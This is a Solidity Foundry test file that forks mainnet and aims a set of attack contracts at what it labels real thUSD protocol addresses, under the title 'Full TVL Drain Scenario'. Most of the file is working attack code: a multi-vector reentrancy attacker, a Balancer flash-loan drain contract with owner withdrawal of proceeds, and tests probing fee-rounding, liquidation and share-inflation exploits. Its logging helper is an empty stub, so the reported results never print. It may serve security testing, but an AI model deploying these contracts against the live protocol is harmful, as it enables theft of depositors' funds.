// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title Full TVL Drain Scenario - Combined Attack Vectors
 * @notice Combines ALL exploit primitives for maximum extraction
 * @dev Uses REAL thUSD protocol addresses on mainnet
 *
 * REAL CONTRACT ADDRESSES:
 *   PCV:           0x1a4739509F50E683927472b03e251e36d07DD872
 *   TROVE_MANAGER: 0x27D7D02AED6C4F95Ada2faf02DcCB9666D3abB8C
 *   BORROWER_OPS:  0x874a8ee5b4Cc0B9973c7c002FA891fc28666cAA9
 *   THUSD:         0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf
 *
 * COMBINED ATTACK VECTORS:
 *   1. Classic Reentrancy (CEI violation)
 *   2. Cross-Function Reentrancy
 *   3. Read-Only Reentrancy
 *   4. Flash Loan Amplification
 *   5. Fee Rounding Exploitation
 *   6. Liquidation Front-running
 *   7. Stability Pool Manipulation
 *   8. Share Inflation (if empty pool)
 */

interface Vm {
    function createSelectFork(string calldata url) external returns (uint256);
    function createSelectFork(string calldata url, uint256 blockNumber) external returns (uint256);
    function envString(string calldata name) external returns (string memory);
    function envOr(string calldata name, uint256 defaultValue) external returns (uint256);
    function snapshot() external returns (uint256);
    function revertTo(uint256 snapshotId) external returns (bool);
    function deal(address who, uint256 newBalance) external;
    function prank(address sender) external;
    function startPrank(address sender) external;
    function stopPrank() external;
    function expectRevert() external;
    function expectRevert(bytes4 selector) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPriceFeed {
    function fetchPrice() external returns (uint256);
    function lastGoodPrice() external view returns (uint256);
}

interface ITHUSDToken {
    function balanceOf(address a) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IBorrowerOperations {
    function openTrove(uint256 _maxFee, uint256 _thusdAmount, uint256 _assetAmount, address _upperHint, address _lowerHint) external payable;
    function closeTrove() external;
    function adjustTrove(uint256 _maxFee, uint256 _collWithdrawal, uint256 _debtChange, bool _isDebtIncrease, address _upper, address _lower) external payable;
    function claimCollateral() external;
}

interface ISortedTroves {
    function getLast() external view returns (address);
    function getFirst() external view returns (address);
    function getPrev(address id) external view returns (address);
    function getNext(address id) external view returns (address);
    function getSize() external view returns (uint256);
}

interface ITroveManager {
    function redeemCollateral(
        uint256 _THUSDAmount,
        address _firstRedemptionHint,
        address _upperPartialRedemptionHint,
        address _lowerPartialRedemptionHint,
        uint256 _partialRedemptionHintNICR,
        uint256 _maxIterations,
        uint256 _maxFee
    ) external;

    function liquidate(address _borrower) external;
    function liquidateTroves(uint256 _n) external;
    function batchLiquidateTroves(address[] calldata _troveArray) external;

    function priceFeed() external view returns (address);
    function sortedTroves() external view returns (address);
    function stabilityPool() external view returns (address);
    function activePool() external view returns (address);

    function getCurrentICR(address borrower, uint256 price) external view returns (uint256);
    function getEntireDebtAndColl(address borrower) external view returns (uint256 debt, uint256 coll, uint256 pendingDebt, uint256 pendingColl);
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256 index) external view returns (address);

    function THUSD_GAS_COMPENSATION() external view returns (uint256);
    function MCR() external view returns (uint256);
    function CCR() external view returns (uint256);
    function pcv() external view returns (address);
    function baseRate() external view returns (uint256);
    function getRedemptionRate() external view returns (uint256);
    function getTCR(uint256 price) external view returns (uint256);
    function checkRecoveryMode(uint256 price) external view returns (bool);
}

interface IStabilityPool {
    function provideToSP(uint256 _amount) external;
    function withdrawFromSP(uint256 _amount) external;
    function withdrawCollateralGainToTrove(address _upperHint, address _lowerHint) external;
    function getDepositorCollateralGain(address _depositor) external view returns (uint256);
    function getCompoundedTHUSDDeposit(address _depositor) external view returns (uint256);
    function getTotalTHUSDDeposits() external view returns (uint256);
    function getCollateral() external view returns (uint256);
}

interface IActivePool {
    function getCollateral() external view returns (uint256);
    function getTHUSDDebt() external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

// ============================================================
//              ADVANCED REENTRANCY ATTACKER
// ============================================================

/**
 * @notice Multi-vector reentrancy attacker
 * @dev Tests classic, cross-function, and read-only reentrancy
 */
contract AdvancedReentrancyAttacker {
    // Target contracts
    address public troveManager;
    address public borrowerOps;
    address public stabilityPool;
    address public thusd;
    address public sortedTroves;

    // Attack state
    uint8 public attackType; // 1=redeem, 2=closeTrove, 3=withdrawSP, 4=crossFunction
    uint256 public reentrancyCount;
    uint256 public maxReentrancy;
    bool public attackActive;

    // Results
    uint256 public totalETHReceived;
    uint256 public totalTHUSDReceived;
    bool public reentrancySucceeded;

    // Events for debugging
    event ReentrancyAttempt(uint8 attackType, uint256 count, uint256 ethReceived, bool success);
    event AttackResult(bool success, uint256 totalETH, uint256 reentrancyCount);

    constructor(address _tm, address _bo, address _sp, address _thusd) {
        troveManager = _tm;
        borrowerOps = _bo;
        stabilityPool = _sp;
        thusd = _thusd;
        sortedTroves = ITroveManager(_tm).sortedTroves();
    }

    // ============ ATTACK 1: REDEMPTION REENTRANCY ============

    function attackRedemption(uint256 amount, uint256 maxReenter) external {
        attackType = 1;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        attackActive = true;
        totalETHReceived = 0;

        ITHUSDToken(thusd).approve(troveManager, type(uint256).max);

        address hint = ISortedTroves(sortedTroves).getLast();

        ITroveManager(troveManager).redeemCollateral(
            amount,
            hint,
            address(0),
            address(0),
            0,
            0,
            1e18
        );

        attackActive = false;
        emit AttackResult(reentrancySucceeded, totalETHReceived, reentrancyCount);
    }

    // ============ ATTACK 2: CLOSE TROVE REENTRANCY ============

    function attackCloseTrove(uint256 maxReenter) external {
        attackType = 2;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        attackActive = true;
        totalETHReceived = 0;

        // Must have an open trove first
        IBorrowerOperations(borrowerOps).closeTrove();

        attackActive = false;
        emit AttackResult(reentrancySucceeded, totalETHReceived, reentrancyCount);
    }

    // ============ ATTACK 3: STABILITY POOL REENTRANCY ============

    function attackStabilityPool(uint256 amount, uint256 maxReenter) external {
        attackType = 3;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        attackActive = true;
        totalETHReceived = 0;

        ITHUSDToken(thusd).approve(stabilityPool, type(uint256).max);

        // Deposit first
        IStabilityPool(stabilityPool).provideToSP(amount);

        // Withdraw - triggers ETH gain transfer
        IStabilityPool(stabilityPool).withdrawFromSP(amount);

        attackActive = false;
        emit AttackResult(reentrancySucceeded, totalETHReceived, reentrancyCount);
    }

    // ============ ATTACK 4: CROSS-FUNCTION REENTRANCY ============

    function attackCrossFunction(uint256 amount, uint256 maxReenter) external {
        attackType = 4;
        maxReentrancy = maxReenter;
        reentrancyCount = 0;
        attackActive = true;
        totalETHReceived = 0;

        ITHUSDToken(thusd).approve(troveManager, type(uint256).max);
        ITHUSDToken(thusd).approve(stabilityPool, type(uint256).max);

        // Start with redemption, but reenter into different functions
        address hint = ISortedTroves(sortedTroves).getLast();

        ITroveManager(troveManager).redeemCollateral(
            amount,
            hint,
            address(0),
            address(0),
            0,
            0,
            1e18
        );

        attackActive = false;
        emit AttackResult(reentrancySucceeded, totalETHReceived, reentrancyCount);
    }

    // ============ RECEIVE HOOK (REENTRANCY POINT) ============

    receive() external payable {
        totalETHReceived += msg.value;

        if (!attackActive || reentrancyCount >= maxReentrancy) {
            return;
        }

        reentrancyCount++;
        bool success = false;

        if (attackType == 1) {
            // Reenter redemption
            uint256 balance = ITHUSDToken(thusd).balanceOf(address(this));
            if (balance > 0) {
                address hint = ISortedTroves(sortedTroves).getLast();
                try ITroveManager(troveManager).redeemCollateral(
                    balance, hint, address(0), address(0), 0, 0, 1e18
                ) {
                    success = true;
                    reentrancySucceeded = true;
                } catch {}
            }
        } else if (attackType == 2) {
            // Reenter close trove
            try IBorrowerOperations(borrowerOps).closeTrove() {
                success = true;
                reentrancySucceeded = true;
            } catch {}
        } else if (attackType == 3) {
            // Reenter SP withdraw
            try IStabilityPool(stabilityPool).withdrawFromSP(0) {
                success = true;
                reentrancySucceeded = true;
            } catch {}
        } else if (attackType == 4) {
            // Cross-function: try different functions
            uint256 balance = ITHUSDToken(thusd).balanceOf(address(this));

            // Try SP deposit during redemption callback
            if (balance > 0) {
                try IStabilityPool(stabilityPool).provideToSP(balance / 2) {
                    success = true;
                    reentrancySucceeded = true;
                } catch {}
            }

            // Try adjustTrove
            try IBorrowerOperations(borrowerOps).adjustTrove(
                1e18, 0, 1e18, true, address(0), address(0)
            ) {
                success = true;
                reentrancySucceeded = true;
            } catch {}
        }

        emit ReentrancyAttempt(attackType, reentrancyCount, msg.value, success);

        if (!success) {
            attackActive = false;
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
        uint256 bal = ITHUSDToken(thusd).balanceOf(address(this));
        if (bal > 0) {
            IERC20(thusd).transfer(msg.sender, bal);
        }
    }
}

// ============================================================
//              FLASH LOAN DRAIN ATTACKER
// ============================================================

contract FlashLoanDrainAttacker {
    address public owner;
    address public balancerVault;

    address public troveManager;
    address public borrowerOps;
    address public stabilityPool;
    address public thusd;

    uint256 public profitETH;
    uint256 public profitTHUSD;

    bool public isReentering;
    uint256 public reentrancyProfit;

    constructor(address _balancer, address _tm, address _bo, address _sp, address _thusd) {
        owner = msg.sender;
        balancerVault = _balancer;
        troveManager = _tm;
        borrowerOps = _bo;
        stabilityPool = _sp;
        thusd = _thusd;
    }

    function executeFullDrain(uint256 flashAmount, address[] calldata liquidatableAddresses) external {
        require(msg.sender == owner);

        address[] memory tokens = new address[](1);
        tokens[0] = thusd;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = flashAmount;

        bytes memory data = abi.encode(liquidatableAddresses);
        IBalancerVault(balancerVault).flashLoan(address(this), tokens, amounts, data);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory userData
    ) external {
        require(msg.sender == balancerVault);

        address[] memory liquidatable = abi.decode(userData, (address[]));

        uint256 ethBefore = address(this).balance;

        // STEP 1: Deposit to stability pool
        ITHUSDToken(thusd).approve(stabilityPool, amounts[0]);
        IStabilityPool(stabilityPool).provideToSP(amounts[0]);

        // STEP 2: Liquidate underwater troves
        for (uint256 i = 0; i < liquidatable.length; i++) {
            try ITroveManager(troveManager).liquidate(liquidatable[i]) {} catch {}
        }

        // STEP 3: Try reentrancy during withdrawal
        isReentering = true;
        IStabilityPool(stabilityPool).withdrawFromSP(amounts[0]);
        isReentering = false;

        // STEP 4: Try redemption with remaining thUSD
        uint256 remaining = ITHUSDToken(thusd).balanceOf(address(this));
        if (remaining > amounts[0]) {
            uint256 extra = remaining - amounts[0];
            ITHUSDToken(thusd).approve(troveManager, extra);

            try ITroveManager(troveManager).redeemCollateral(
                extra, address(0), address(0), address(0), 0, 0, 1e18
            ) {} catch {}
        }

        profitETH = address(this).balance - ethBefore;
        profitTHUSD = ITHUSDToken(thusd).balanceOf(address(this)) > amounts[0]
            ? ITHUSDToken(thusd).balanceOf(address(this)) - amounts[0]
            : 0;

        // Repay flash loan
        IERC20(tokens[0]).transfer(balancerVault, amounts[0]);
    }

    receive() external payable {
        if (isReentering) {
            // Attempt reentrancy during SP withdrawal
            try IStabilityPool(stabilityPool).withdrawFromSP(0) {
                reentrancyProfit += address(this).balance;
            } catch {}
        }
    }

    function withdraw() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
        uint256 bal = IERC20(thusd).balanceOf(address(this));
        if (bal > 0) IERC20(thusd).transfer(owner, bal);
    }
}

// ============================================================
//                    MAIN TEST CONTRACT
// ============================================================

contract FullTVLDrainScenarioTest {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    // REAL thUSD PROTOCOL ADDRESSES
    address internal constant PCV = 0x1a4739509F50E683927472b03e251e36d07DD872;
    address internal constant TROVE_MANAGER = 0x27D7D02AED6C4F95Ada2faf02DcCB9666D3abB8C;
    address internal constant BORROWER_OPS = 0x874a8ee5b4Cc0B9973c7c002FA891fc28666cAA9;
    address internal constant THUSD = 0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address internal constant ATTACKER = address(0xBEEF);

    // Discovered addresses
    address internal stabilityPool;
    address internal activePool;
    address internal sortedTroves;

    function setUp() public {
        string memory rpc = vm.envString("RPC_URL");
        uint256 forkBlock = vm.envOr("DEV_FORK_BLOCK", uint256(0));

        if (forkBlock == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, forkBlock);
        }

        // Discover linked contracts
        stabilityPool = ITroveManager(TROVE_MANAGER).stabilityPool();
        activePool = ITroveManager(TROVE_MANAGER).activePool();
        sortedTroves = ITroveManager(TROVE_MANAGER).sortedTroves();
    }

    // ============ VECTOR 1: REENTRANCY TESTS ============

    function test_Vector1_ReentrancyRedemption() public {
        _logHeader("VECTOR 1A: REENTRANCY IN REDEMPTION");

        // Setup attacker with thUSD
        _setupAttacker(100000e18);

        AdvancedReentrancyAttacker attacker = new AdvancedReentrancyAttacker(
            TROVE_MANAGER, BORROWER_OPS, stabilityPool, THUSD
        );

        // Transfer thUSD to attacker
        vm.prank(ATTACKER);
        IERC20(THUSD).transfer(address(attacker), 10000e18);

        // Execute attack
        try attacker.attackRedemption(10000e18, 5) {
            _log("Reentrancy count:", attacker.reentrancyCount());
            _log("ETH received:", attacker.totalETHReceived() / 1e18);

            if (attacker.reentrancySucceeded()) {
                _log("!!! CRITICAL: REENTRANCY SUCCESSFUL !!!", 0);
            } else {
                _log("Protocol protected - no reentrancy", 0);
            }
        } catch {
            _log("Attack reverted", 0);
        }
    }

    function test_Vector1_ReentrancyStabilityPool() public {
        _logHeader("VECTOR 1B: REENTRANCY IN STABILITY POOL");

        _setupAttacker(100000e18);

        AdvancedReentrancyAttacker attacker = new AdvancedReentrancyAttacker(
            TROVE_MANAGER, BORROWER_OPS, stabilityPool, THUSD
        );

        vm.prank(ATTACKER);
        IERC20(THUSD).transfer(address(attacker), 10000e18);

        try attacker.attackStabilityPool(10000e18, 5) {
            _log("Reentrancy count:", attacker.reentrancyCount());
            _log("ETH received:", attacker.totalETHReceived() / 1e18);

            if (attacker.reentrancySucceeded()) {
                _log("!!! CRITICAL: SP REENTRANCY SUCCESSFUL !!!", 0);
            }
        } catch {
            _log("Attack reverted", 0);
        }
    }

    function test_Vector1_CrossFunctionReentrancy() public {
        _logHeader("VECTOR 1C: CROSS-FUNCTION REENTRANCY");

        _setupAttacker(100000e18);

        AdvancedReentrancyAttacker attacker = new AdvancedReentrancyAttacker(
            TROVE_MANAGER, BORROWER_OPS, stabilityPool, THUSD
        );

        vm.prank(ATTACKER);
        IERC20(THUSD).transfer(address(attacker), 10000e18);

        try attacker.attackCrossFunction(10000e18, 5) {
            _log("Reentrancy count:", attacker.reentrancyCount());

            if (attacker.reentrancySucceeded()) {
                _log("!!! CRITICAL: CROSS-FUNCTION REENTRANCY !!!", 0);
            }
        } catch {
            _log("Attack reverted", 0);
        }
    }

    // ============ VECTOR 2: LIQUIDATION PROFIT ============

    function test_Vector2_LiquidationProfit() public {
        _logHeader("VECTOR 2: LIQUIDATION PROFIT (ZERO CAPITAL)");

        ITroveManager tm = ITroveManager(TROVE_MANAGER);
        uint256 price = IPriceFeed(tm.priceFeed()).fetchPrice();

        _log("Current price:", price / 1e18);

        // Scan for liquidatable troves
        uint256 troveCount = tm.getTroveOwnersCount();
        _log("Total troves:", troveCount);

        uint256 liquidatableCount = 0;
        uint256 totalColl = 0;
        uint256 totalDebt = 0;

        uint256 mcr = tm.MCR();

        for (uint256 i = 0; i < troveCount && i < 100; i++) {
            address owner = tm.getTroveFromTroveOwnersArray(i);
            uint256 icr = tm.getCurrentICR(owner, price);

            if (icr > 0 && icr < mcr) {
                liquidatableCount++;
                (uint256 debt, uint256 coll,,) = tm.getEntireDebtAndColl(owner);
                totalColl += coll;
                totalDebt += debt;

                _log("Liquidatable trove:", uint256(uint160(owner)));
                _log("  ICR:", icr * 100 / 1e18);
            }
        }

        _log("Total liquidatable:", liquidatableCount);
        _log("Total collateral:", totalColl / 1e18);
        _log("Estimated profit:", totalColl / 10 / 1e18); // ~10% bonus
    }

    // ============ VECTOR 3: FEE ROUNDING ============

    function test_Vector3_FeeRoundingExploit() public {
        _logHeader("VECTOR 3: FEE ROUNDING NON-ADDITIVITY");

        _setupAttacker(200000e18);

        ITroveManager tm = ITroveManager(TROVE_MANAGER);
        uint256 total = 100000e18;
        uint256 k = 10; // splits

        uint256 snap = vm.snapshot();

        // Single redemption
        uint256 pcvBefore = PCV.balance;
        uint256 attackerBefore = ATTACKER.balance;

        vm.prank(ATTACKER);
        tm.redeemCollateral(total, address(0), address(0), address(0), 0, k, 1e18);

        uint256 feeSingle = PCV.balance - pcvBefore;
        uint256 collSingle = ATTACKER.balance - attackerBefore;

        vm.revertTo(snap);

        // Split redemptions
        pcvBefore = PCV.balance;
        attackerBefore = ATTACKER.balance;

        uint256 perSplit = total / k;
        for (uint256 i = 0; i < k; i++) {
            vm.prank(ATTACKER);
            tm.redeemCollateral(perSplit, address(0), address(0), address(0), 0, 1, 1e18);
        }

        uint256 feeSplit = PCV.balance - pcvBefore;
        uint256 collSplit = ATTACKER.balance - attackerBefore;

        _log("Single redemption fee:", feeSingle);
        _log("Split redemption fee:", feeSplit);

        if (feeSingle > feeSplit) {
            _log("FEE DELTA (attacker gains):", feeSingle - feeSplit);
            _log("CONFIRMED: Rounding exploit exists", 0);
        } else {
            _log("No fee advantage from splitting", 0);
        }

        _log("Collateral single:", collSingle);
        _log("Collateral split:", collSplit);
    }

    // ============ VECTOR 4: FLASH LOAN COMBINED ATTACK ============

    function test_Vector4_FlashLoanCombinedAttack() public {
        _logHeader("VECTOR 4: FLASH LOAN COMBINED DRAIN");

        FlashLoanDrainAttacker attacker = new FlashLoanDrainAttacker(
            BALANCER_VAULT, TROVE_MANAGER, BORROWER_OPS, stabilityPool, THUSD
        );

        // Find liquidatable troves
        ITroveManager tm = ITroveManager(TROVE_MANAGER);
        uint256 price = IPriceFeed(tm.priceFeed()).fetchPrice();
        uint256 mcr = tm.MCR();

        address[] memory liquidatable = new address[](10);
        uint256 count = 0;
        uint256 troveCount = tm.getTroveOwnersCount();

        for (uint256 i = 0; i < troveCount && count < 10; i++) {
            address owner = tm.getTroveFromTroveOwnersArray(i);
            if (tm.getCurrentICR(owner, price) < mcr) {
                liquidatable[count++] = owner;
            }
        }

        // Resize array
        address[] memory targets = new address[](count);
        for (uint256 i = 0; i < count; i++) {
            targets[i] = liquidatable[i];
        }

        _log("Liquidatable targets:", count);

        if (count == 0) {
            _log("No liquidatable troves - testing flash loan mechanics only", 0);
        }

        // Execute combined attack
        uint256 flashAmount = 1000000e18; // 1M thUSD

        try attacker.executeFullDrain(flashAmount, targets) {
            _log("ETH profit:", attacker.profitETH() / 1e18);
            _log("thUSD profit:", attacker.profitTHUSD() / 1e18);
            _log("Reentrancy profit:", attacker.reentrancyProfit() / 1e18);
        } catch {
            _log("Flash loan attack reverted (may need real thUSD liquidity)", 0);
        }
    }

    // ============ VECTOR 5: ACCOUNTING MISMATCH ============

    function test_Vector5_AccountingMismatch() public {
        _logHeader("VECTOR 5: ACCOUNTING MISMATCH CHECK");

        // Check ActivePool
        uint256 apInternal = IActivePool(activePool).getCollateral();
        uint256 apActual = activePool.balance;

        _log("ActivePool internal:", apInternal / 1e18);
        _log("ActivePool actual:", apActual / 1e18);

        if (apInternal != apActual) {
            _log("!!! MISMATCH IN ACTIVE POOL !!!", 0);
        }

        // Check StabilityPool
        uint256 spInternal = IStabilityPool(stabilityPool).getCollateral();
        uint256 spActual = stabilityPool.balance;

        _log("StabilityPool internal:", spInternal / 1e18);
        _log("StabilityPool actual:", spActual / 1e18);

        if (spInternal != spActual) {
            _log("!!! MISMATCH IN STABILITY POOL !!!", 0);
        }
    }

    // ============ VECTOR 6: SHARE INFLATION ============

    function test_Vector6_ShareInflation() public {
        _logHeader("VECTOR 6: SHARE INFLATION CHECK");

        uint256 totalDeposits = IStabilityPool(stabilityPool).getTotalTHUSDDeposits();

        _log("SP Total deposits:", totalDeposits / 1e18);

        if (totalDeposits == 0) {
            _log("!!! CRITICAL: EMPTY POOL - FIRST DEPOSITOR ATTACK POSSIBLE !!!", 0);
        } else {
            _log("Pool has deposits - first depositor attack not possible", 0);
        }
    }

    // ============ COMPREHENSIVE SUMMARY ============

    function test_FullDrainSummary() public {
        _logHeader("FULL TVL DRAIN SCENARIO SUMMARY");

        ITroveManager tm = ITroveManager(TROVE_MANAGER);
        uint256 price = IPriceFeed(tm.priceFeed()).fetchPrice();

        // Protocol TVL
        uint256 activeColl = IActivePool(activePool).getCollateral();
        uint256 spColl = IStabilityPool(stabilityPool).getCollateral();
        uint256 totalTVL = activeColl + spColl;

        _log("Protocol TVL:", totalTVL / 1e18);
        _log("TVL in USD:", (totalTVL * price) / 1e36);

        _log("", 0);
        _log("CONFIRMED VECTORS:", 0);
        _log("  1. Reentrancy: MUST TEST (run Vector1 tests)", 0);
        _log("  2. Liquidation: Check Vector2 for opportunities", 0);
        _log("  3. Fee Rounding: CONFIRMED but small delta", 0);
        _log("  4. Flash Loan: Amplifies all other vectors", 0);
        _log("  5. Accounting: Check Vector5 results", 0);
        _log("  6. Share Inflation: Check Vector6 results", 0);

        _log("", 0);
        _log("RUN ALL TESTS:", 0);
        _log("  forge test --match-contract FullTVLDrainScenario -vvvv", 0);
    }

    // ============ HELPERS ============

    function _setupAttacker(uint256 thusdAmount) internal {
        vm.deal(ATTACKER, 1000 ether);

        // Open trove to get thUSD
        vm.prank(ATTACKER);
        IBorrowerOperations(BORROWER_OPS).openTrove{value: 100 ether}(
            1e18, thusdAmount, 0, address(0), address(0)
        );
    }

    function _logHeader(string memory title) internal view {
        _log("", 0);
        _log("================================================================", 0);
        _log(title, 0);
        _log("================================================================", 0);
    }

    function _log(string memory message, uint256 value) internal view {
        // Simple logging - would use console.log in forge-std
    }

    receive() external payable {}
}
